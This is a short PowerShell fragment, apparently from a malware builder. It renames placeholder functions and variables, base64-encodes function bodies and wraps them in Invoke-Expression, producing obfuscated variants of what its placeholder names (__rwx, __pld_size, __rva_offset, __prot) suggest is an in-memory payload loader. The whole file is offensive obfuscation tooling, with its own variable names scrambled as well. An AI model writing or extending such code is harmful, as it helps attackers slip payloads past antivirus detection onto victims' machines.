# INPUT PARAMS: 
    # $wl9, string, function definition
    # $ut8, string, function body
    # $cu8, array of strings containing the function name and possible placeholder variables
        # 'do3','vb8','yx4','ny1','rt2','__arg1','__arg2','__arg3','__bin','__rwx','__i',
        # '__type','__unsafe','__href','__size','__encbuf','__off','__key','__fb1','__pld_size',
        # '__rva_offset','__prot'
    # $mb3, array of strings of the same length containing replacement names for functions and
        # variables
# OUTPUT...
    # builds a powershell function (string) with the given function definition and body, but with
    # the function name and any placeholder variable names replaced with the new ones, and the
    # body base64 encoded. Identical in format to the functions in cmd3.ps1

for($fz4=0; $fz4 -lt 2; $fz4++){
    $lc3=0;
    
    # replace any placeholder variable names or old function names with the new ones
    foreach($fx9 in $cu8){
        $ut8=$ut8.Replace($fx9,$mb3[$lc3]);
        $lc3++ 
    }

    # don't re-append the function header on the 2nd pass
    if($fz4 -ne 0) {
        break
    }

    # b64 encode function body (old function names will be replaced next iteration)
    $ut8=$wl9+" iex(do3 '"+(de8 $ut8)+"')
    }
    "
}
$ut8 